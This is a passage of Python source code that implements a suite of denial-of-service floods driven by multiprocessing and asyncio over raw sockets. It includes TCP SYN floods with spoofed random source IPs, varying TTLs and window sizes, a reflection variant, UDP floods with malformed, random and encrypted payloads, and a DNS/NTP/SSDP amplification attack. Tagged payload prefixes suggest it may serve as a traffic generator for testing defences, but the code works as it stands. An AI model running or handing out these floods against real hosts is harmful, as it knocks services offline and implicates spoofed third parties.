        num_processes_per_ip = max(1, (multiprocessing.cpu_count() // 2) // len(self.target_ips))
        processes = []
        
        # Create and start processes for each target IP
        for target_ip in self.target_ips:
            for _ in range(num_processes_per_ip):
                p = multiprocessing.Process(
                    target=self.run_process,
                    args=(total_duration, self.pause_event, target_ip)
                )
                p.start()
                processes.append(p)
        
        for p in processes:
            p.join()
        logger.info("All UDP traffic simulation processes have completed.")
    
    def run_process(self, total_duration: int, pause_event: Event, target_ip: str) -> None:
        # NEW: Initialize start_time in the child process to ensure the UDP loop runs for the full duration.
        self.start_time = time.time()
        asyncio.run(self.simulate_realistic_conditions(target_ip, total_duration, pause_event))
    
    async def simulate_realistic_conditions(self, target_ip: str, total_duration: int, 
                                            pause_event: Event) -> None:
        """Simulate both standard load phases and random bursts over an extended period."""
        regions = ['NA', 'EU', 'ASIA', 'SA', 'AF', 'OCEANIA']
        while time.time() - self.start_time < total_duration:
            region = random.choice(regions)
            if random.random() < 0.05:
                await self.burst_traffic(target_ip, region, pause_event)
            else:
                remaining_time = self.start_time + total_duration - time.time()
                phase_duration = min(random.randint(1800, 3600), remaining_time)
                await self.manage_load_phases(target_ip, phase_duration, pause_event)
    
    async def manage_load_phases(self, target_ip: str, total_duration: int, 
                                 pause_event: Event) -> None:
        regions = ['NA', 'EU', 'ASIA', 'SA', 'AF', 'OCEANIA']
        traffic_types = ['DNS', 'NTP', 'SSDP', 'RANDOM']
        
        start_time = time.time()
        while time.time() - start_time < total_duration:
            region = random.choice(regions)
            traffic_type = random.choice(traffic_types)
            rate = self.determine_traffic_load()
            phase_duration = min(random.randint(3600, 7200), total_duration - (time.time() - start_time))
            await self.simulate_phase_for_target(
                target_ip, rate, phase_duration, region, traffic_type, pause_event
            )
    
    async def burst_traffic(self, target_ip: str, region: str, pause_event: Event) -> None:
        burst_duration = min(random.randint(300, 600), self.duration)
        burst_rate = random.randint(7000, 15000)
        await self.simulate_phase_for_target(
            target_ip, burst_rate, burst_duration, region, "BURST", pause_event
        )
    
    async def simulate_phase_for_target(self, target_ip: str, rate: int, duration: int, 
                                        region: str, traffic_type: str, 
                                        pause_event: Event) -> None:
        start_time = time.time()
        burst_mode = False
        
        while time.time() - start_time < duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
            
            src_ip = self.generate_random_ip()
            sport = random.randint(1024, 65535)
            dport = random.choice([53, 123, 1900, 11211, 80, 443, 22, 21, 3306, 53])
            ttl = random.randint(1, 128)
            payload = self.generate_payload("BENIGN-UDP-", self.packet_factory.max_udp_payload_size)
            
            if random.random() < 0.15:
                burst_mode = True
                rate = random.randint(5000, 15000)
            
            await self.simulate_real_world_load(
                src_ip, dport, ttl, payload,
                duration=3, pause_event=pause_event, target_ip=target_ip
            )
            
            if burst_mode:
                burst_mode = False
                rate = random.randint(500, 1000)
            await asyncio.sleep(max(0.0001, random.uniform(0.001 / rate, 0.05 / rate)))
    
    async def simulate_real_world_load(self, src_ip: str, dport: int, ttl: int, 
                                   payload: str, duration: int, pause_event: Event, 
                                   target_ip: str) -> None:
        """Simulate real-world load by sending UDP packets using raw sockets."""
        start_time = time.time()
        
        # Create a raw socket for sending packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            while time.time() - start_time < duration:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                
                sport = random.randint(1024, 65535)
                
                # Use packet factory to create UDP packet with MTU limits
                packet = self.packet_factory.create_udp_packet(
                    src_ip=src_ip,
                    dst_ip=target_ip,
                    sport=sport,
                    dport=dport,
                    payload=payload
                )
                
                # Modify TTL in the IP header (8th byte)
                if ttl != 255:  # Default TTL in create_udp_packet is 255
                    packet = packet[:8] + struct.pack("!B", ttl) + packet[9:]
                
                try:
                    sock.sendto(packet, (target_ip, 0))
                    logger.debug(f"UDP Packet sent to {target_ip} with dst port {dport}")
                except OSError as e:
                    logger.error(f"Error sending UDP packet: {e}")
                
                if random.random() < 0.02:
                    idle_time = random.uniform(0.01, 0.2)
                    await asyncio.sleep(idle_time)
                
                if random.randint(0, 10000) < 1:
                    pause_time = random.uniform(0.5, 2)
                    logger.info(f"Pausing UDP traffic for {pause_time:.2f} seconds for natural idle period...")
                    await asyncio.sleep(pause_time)
        finally:
            sock.close()


#################
##-TCP-ATTACKS-##
#################


class TCPVariableWindowSYNFlood(TCPAttack):
    """Implements a TCP Variable Window SYN Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Variable Window SYN Flood Attack")
        self.start_flood()

    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.variable_window_syn_flood(sock, rate, pause_event))
        sock.close()

    async def variable_window_syn_flood(self, sock: socket.socket, rate: int, 
                                        pause_event: Event) -> None:
        start_time = time.time()
        # Use our generate_payload, override if custom_identifier is set
        payload = self.generate_payload("TCP_SYN_FLOOD-variable-window-")
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            src_ip = self.generate_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            window_size = random.randint(1, 65535)
            flags = 'S'  # SYN
            
            packet = self.packet_factory.create_tcp_packet(
                src_ip, self.target_ip, src_port, dst_port, 
                payload, window_size=window_size, flags=flags
            )
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
            await asyncio.gather(*tasks)
            
            base_interval = 1.0 / rate
            await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))


class TCPSYNFloodReflection(TCPAttack):
    """Implements a TCP SYN Flood Reflection attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Amplified SYN Flood Reflection Attack")
        reflection_ips = [self.generate_random_ip() for _ in range(10)]
        num_processes = cpu_count()
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_flood_process, args=(reflection_ips, self.pause_event))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_flood_process(self, reflection_ips: List[str], pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.send_packets_loop(sock, reflection_ips, pause_event))
        sock.close()
    
    async def send_packets_loop(self, sock: socket.socket, reflection_ips: List[str], 
                                pause_event: Event) -> None:
        # Use our generate_payload
        payload = self.generate_payload("TCP_SYN_FLOOD-amplified-syn-flood-")
        start_time = time.time()
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            reflection_ip = random.choice(reflection_ips)
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            
            packet = self.packet_factory.create_tcp_packet(
                reflection_ip, self.target_ip, src_port, dst_port, payload
            )
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(100)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.000001)


class TCPAsyncSlowSYNFlood(TCPAttack):
    """Implements a TCP Async Slow SYN Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Async Slow SYN Flood Attack")
        reflection_ips = [self.generate_random_ip() for _ in range(10)]
        num_processes = multiprocessing.cpu_count() * 8
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_flood_process, args=(reflection_ips, self.pause_event))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()

    def run_flood_process(self, reflection_ips: List[str], pause_event: Event) -> None:
        asyncio.run(self.amplified_syn_flood(reflection_ips, pause_event))
    
    async def amplified_syn_flood(self, reflection_ips: List[str], pause_event: Event) -> None:
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-async-slow-syn-flood-")
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            while time.time() - start_time < self.duration:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                reflection_ip = random.choice(reflection_ips)
                tasks = [self.send_spoofed_syn_packet(sock, reflection_ip, payload) for _ in range(100)]
                await asyncio.gather(*tasks)
                await asyncio.sleep(random.uniform(0.1, 0.5))
        finally:
            sock.close()
    
    async def send_spoofed_syn_packet(self, sock: socket.socket, reflection_ip: str, 
                                      payload: str) -> None:
        src_port = random.randint(1024, 65535)
        dst_port = self.choose_port_strategy()
        
        ip_header = IP(src=reflection_ip, dst=self.target_ip)
        tcp_header = TCP(sport=src_port, dport=dst_port, flags="S")
        packet = ip_header / tcp_header / Raw(load=payload)
        
        try:
            sock.sendto(bytes(packet), (self.target_ip, dst_port))
        except OSError as e:
            logger.error(f"Error sending packet: {e}")
            
        await asyncio.sleep(random.uniform(0.00001, 0.00005))


class TCPBatchSYNFlood(TCPAttack):
    """Implements a TCP Batch SYN Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Batch SYN Flood Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_flood_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_flood_process(self, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.tcp_syn_flood_batch(sock, pause_event))
        sock.close()
    
    async def tcp_syn_flood_batch(self, sock: socket.socket, pause_event: Event) -> None:
        src_ip = self.generate_random_ip()
        start_time = time.time()
        max_payload_size = self.interface_mtu - 40 if self.interface_mtu else 1405
        # Use generate_payload with potential override
        payload = self.generate_payload("TCP_SYN_FLOOD-batch-syn-flood-", max_payload_size)
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            tasks = []
            for _ in range(1000):
                dst_port = self.choose_port_strategy()
                src_port = random.randint(1024, 65535)
                packet = self.packet_factory.create_tcp_packet(
                    src_ip, self.target_ip, src_port, dst_port, payload
                )
                tasks.append(self.async_send_packet(sock, packet))
                
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.000001)


class TCPRandomizedSYNFlood(TCPAttack):
    """Implements a TCP Randomized SYN Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Randomized SYN Flood Attack")
        self.start_flood()
    
    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.tcp_syn_flood(sock, rate, pause_event))
        sock.close()
    
    async def tcp_syn_flood(self, sock: socket.socket, rate: int, 
                            pause_event: Event) -> None:
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-synflood-")
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            src_ip = self.generate_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            
            packet = self.packet_factory.create_tcp_packet(
                src_ip, self.target_ip, src_port, dst_port, payload
            )
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
            await asyncio.gather(*tasks)
            
            base_interval = 1.0 / rate
            await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))


class TCPVariableTTLSYNFlood(TCPAttack):
    """Implements a TCP Variable TTL SYN Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Variable TTL SYN Flood Attack")
        self.start_flood()

    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.variable_ttl_syn_flood(sock, rate, pause_event))
        sock.close()

    async def variable_ttl_syn_flood(self, sock: socket.socket, rate: int, 
                                     pause_event: Event) -> None:
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-variable-ttl-syn-flood-")
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            src_ip = self.generate_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            ttl = random.randint(1, 255)
            
            packet = self.packet_factory.create_tcp_packet(
                src_ip, self.target_ip, src_port, dst_port, payload
            )
            
            # Modify TTL in packet (8th byte of IP header)
            packet = packet[:8] + struct.pack("!B", ttl) + packet[9:]
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
            await asyncio.gather(*tasks)
            
            base_interval = 1.0 / rate
            await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))


class TCPTargetedSYNFloodCommonPorts(TCPAttack):
    """Implements a TCP Targeted SYN Flood on common ports."""
    
    def run(self) -> None:
        logger.info("Starting TCP Targeted SYN Flood Common Ports Attack")
        self.start_flood()

    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        asyncio.run(self.tcp_syn_flood_common_ports(rate, pause_event))

    async def tcp_syn_flood_common_ports(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-targeted-syn-flood-")
        common_ports = [80, 443, 53, 22, 21, 25, 110, 8080, 993, 995]
        
        try:
            while time.time() - start_time < self.duration:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                dst_port = random.choice(common_ports)
                
                packet = self.packet_factory.create_tcp_packet(
                    src_ip, self.target_ip, src_port, dst_port, payload
                )
                
                tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
                await asyncio.gather(*tasks)
                
                base_interval = 1.0 / rate
                await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))
        finally:
            sock.close()


class TCPAdaptiveFlood(TCPAttack):
    """Implements a TCP Adaptive Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Adaptive Flood Attack")
        num_processes = cpu_count()
        processes = []
        
        for _ in range(num_processes):
            rate = random.randint(5000, 20000) // num_processes
            p = Process(target=self.run_flood_process, args=(rate, self.pause_event))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.adaptive_syn_flood(sock, rate, pause_event))
        sock.close()
    
    async def adaptive_syn_flood(self, sock: socket.socket, rate: int, 
                                 pause_event: Event) -> None:
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-adaptive-syn-flood-")
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            src_ip = self.generate_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            
            packet = self.packet_factory.create_tcp_packet(
                src_ip, self.target_ip, src_port, dst_port, payload
            )
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
            await asyncio.gather(*tasks)
            
            base_interval = 1.0 / rate
            await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))


class TCPBatchFlood(TCPAttack):
    """Implements a TCP Batch Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Batch Flood Attack")
        num_processes = cpu_count()
        processes = []
        
        for _ in range(num_processes):
            rate = random.randint(5000, 20000) // num_processes
            p = Process(target=self.run_flood_process, args=(rate, self.pause_event))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.batch_syn_flood(sock, rate, pause_event))
        sock.close()
    
    async def batch_syn_flood(self, sock: socket.socket, rate: int, 
                              pause_event: Event) -> None:
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-batch-flood-")
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            src_ip = self.generate_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            
            packet = self.packet_factory.create_tcp_packet(
                src_ip, self.target_ip, src_port, dst_port, payload
            )
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
            await asyncio.gather(*tasks)
            
            base_interval = 1.0 / rate
            await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))


class TCPVariableSynFlood(TCPAttack):
    """Implements a TCP Variable SYN Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Variable SYN Flood Attack")
        self.start_flood()
    
    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.variable_syn_flood(sock, rate, pause_event))
        sock.close()
    
    async def variable_syn_flood(self, sock: socket.socket, rate: int, 
                                 pause_event: Event) -> None:
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-variable-syn-flood-")
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            src_ip = self.generate_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            
            packet = self.packet_factory.create_tcp_packet(
                src_ip, self.target_ip, src_port, dst_port, payload
            )
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
            await asyncio.gather(*tasks)
            
            base_interval = 1.0 / rate
            await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))


class TCPMaxRandomizedFlood(TCPAttack):
    """Implements a TCP Max Randomized Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting TCP Max Randomized Flood Attack")
        self.start_flood()
    
    def run_flood_process(self, rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        asyncio.run(self.max_randomized_syn_flood(sock, rate, pause_event))
        sock.close()
    
    async def max_randomized_syn_flood(self, sock: socket.socket, rate: int, 
                                       pause_event: Event) -> None:
        start_time = time.time()
        payload = self.generate_payload("TCP_SYN_FLOOD-max-randomized-")
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                await asyncio.sleep(1)
                continue
                
            src_ip = self.generate_random_ip()
            src_port = random.randint(1024, 65535)
            dst_port = self.choose_port_strategy()
            
            packet = self.packet_factory.create_tcp_packet(
                src_ip, self.target_ip, src_port, dst_port, payload
            )
            
            tasks = [self.async_send_packet(sock, packet) for _ in range(3000)]
            await asyncio.gather(*tasks)
            
            base_interval = 1.0 / rate
            await asyncio.sleep(random.uniform(0.8 * base_interval, 1.2 * base_interval))


#################
##-UDP-ATTACKS-##
#################


class UDPMalformedPacket(UDPAttack):
    """Implements a UDP Malformed Packet Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting UDP Malformed Packet Flood Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def send_packet_batch(self, sock: socket.socket, pause_event: Event) -> None:
        start_time = time.time()
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                time.sleep(1)
                continue
                
            packets = []
            for _ in range(1000):
                target_port = self.choose_port_strategy()
                sport = random.randint(1024, 65535)
                payload = self.generate_payload("UDP_FLOOD-malformed-packet-")
                packet = self.packet_factory.create_udp_packet(
                    self.generate_random_ip(), self.target_ip, sport, target_port, payload
                )
                packets.append((packet, target_port))
            
            for packet, target_port in packets:
                try:
                    sock.sendto(packet, (self.target_ip, target_port))
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    continue
                    
            time.sleep(0.001)


class UDPMultiProtocolAmplificationAttack(UDPAttack):
    """Implements a UDP Multi-Protocol Amplification attack."""
    
    def generate_dns_query(self) -> bytes:
        # Overridden prefix if custom_identifier is provided
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-AMP-DNS-"
        identifier = prefix + os.urandom(4).hex()
        return identifier.encode() + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    
    def generate_ntp_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-AMP-NTP-"
        identifier = prefix + os.urandom(4).hex()
        return identifier.encode() + b"\x17\x00\x03\x2a"
    
    def generate_ssdp_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-AMP-SSDP-"
        identifier = prefix + os.urandom(4).hex()
        return (identifier + "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:2\r\nMAN:\"ssdp:discover\"\r\n\r\n").encode()
    
    def run(self) -> None:
        logger.info("Starting UDP Multiprotocol Amplification Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 2
        ports = {
            "DNS": 53,
            "NTP": 123,
            "SSDP": 1900
        }
        
        for _ in range(num_tasks):
            service = random.choice(list(ports.keys()))
            payload = getattr(self, f"generate_{service.lower()}_query")()
            port = ports[service]
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, pause_event)
            ))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: bytes, 
                                pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        end_time = time.time() + self.duration
        
        try:
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                
                src_ip = self.generate_random_ip()
                sport = random.randint(1024, 65535)
                packet = IP(src=src_ip, dst=target_ip) / \
                         UDP(sport=sport, dport=port) / \
                         Raw(load=payload)
                packet_bytes = bytes(packet)
                
                try:
                    for _ in range(100):
                        sock.sendto(packet_bytes, (target_ip, port))
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    continue
                
                await asyncio.sleep(0.00001)
        finally:
            sock.close()


class UDPAdaptivePayloadFlood(UDPAttack):
    """Implements a UDP Adaptive Payload Flood attack."""
    
    def generate_adaptive_payload(self) -> str:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-adaptive-"
        # We do not add the random hex here; the default generate_payload logic can add variety
        return self.generate_payload(prefix)
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: str, 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=payload)
            packet_bytes = bytes(packet)
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                try:
                    for _ in range(100):
                        sock.sendto(packet_bytes, (target_ip, port))
                    await asyncio.sleep(1.0 / rate)
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()
    
    async def run_attack(self) -> None:
        tasks = []
        num_tasks = cpu_count() * 2
        
        for _ in range(num_tasks):
            rate = random.randint(20000, 50000)
            payload = self.generate_adaptive_payload()
            port = self.choose_port_strategy()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, self.pause_event)
            ))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    def run(self) -> None:
        logger.info("Starting UDP Adaptive Payload Flood Attack")
        asyncio.run(self.run_attack())


class UDPCompressedEncryptedFlood(UDPAttack):
    """Implements a UDP Compressed Encrypted Flood attack."""
    
    def generate_payload(self) -> str:
        # If user gave custom_identifier, override the default prefix
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-compressed-encr-"
        raw_payload = ''.join(random.choices(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            k=random.randint(200, 1000)
        ))
        compressed_payload = gzip.compress(raw_payload.encode('utf-8'))
        
        key = os.urandom(32)  # AES-256 key
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        
        padding_length = 16 - (len(compressed_payload) % 16)
        padded_payload = compressed_payload + b' ' * padding_length
        encrypted_payload = iv + cipher.encrypt(padded_payload)
        encrypted_payload_base64 = base64.b64encode(encrypted_payload).decode('utf-8')
        
        return prefix + encrypted_payload_base64
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: str, 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=payload)
            packet_bytes = bytes(packet)
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                try:
                    for _ in range(100):
                        sock.sendto(packet_bytes, (target_ip, port))
                    await asyncio.sleep(max(1.0 / rate, 0.0001))
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()
    
    async def run_attack(self) -> None:
        tasks = []
        num_tasks = cpu_count() * 2
        
        for _ in range(num_tasks):
            rate = random.randint(20000, 50000)
            payload = self.generate_payload()
            port = self.choose_port_strategy()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, self.pause_event)
            ))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    def run(self) -> None:
        logger.info("Starting UDP Compressed Encrypted Flood Attack")
        asyncio.run(self.run_attack())


class UDPMaxRandomizedFlood(UDPAttack):
    """Implements a UDP Max Randomized Flood attack."""
    
    def generate_payload(self) -> str:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-max-random-"
        raw_payload = ''.join(random.choices(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            k=random.randint(200, 1000)
        ))
        return prefix + raw_payload
    
    def run(self) -> None:
        logger.info("Starting UDP Max Randomized Flood Attack")
        self.start_flood()
    
    def start_flood(self) -> None:
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 4
        
        for _ in range(num_tasks):
            rate = random.randint(50000, 100000)
            payload = self.generate_payload()
            port = self.choose_port_strategy()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, pause_event)
            ))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: str, 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            while time.time() < (self.start_time + self.duration):
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                
                batch_size = 1000
                packets = []
                
                for _ in range(batch_size):
                    try:
                        dynamic_packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                                         UDP(sport=random.randint(1024, 65535), dport=port) / \
                                         Raw(load=payload)
                        dynamic_packet_bytes = bytes(dynamic_packet)
                        packets.append(dynamic_packet_bytes)
                    except OSError as e:
                        logger.error(f"Error building packet: {e}")
                
                try:
                    for packet in packets:
                        sock.sendto(packet, (target_ip, port))
                except OSError as e:
                    logger.error(f"Error sending packet batch: {e}")
                
                await asyncio.sleep(max(1.0 / rate, 0.00001))
        finally:
            sock.close()


class UDPAndTCPFlood(Attack):
    """Implements a combined UDP and TCP Flood attack."""
    
    protocol_type = ProtocolType.MIXED
    
    def __init__(self, target_ips: List[str], interface: str, duration: int, 
                 pause_event: Optional[Event] = None, min_port: Optional[int] = None, 
                 max_port: Optional[int] = None, custom_identifier: Optional[str] = None):
        super().__init__(target_ips, interface, duration, pause_event, min_port, max_port, custom_identifier)
        logger.info(f"{self.__class__.__name__} initialized with targets: {self.target_ips}")
    
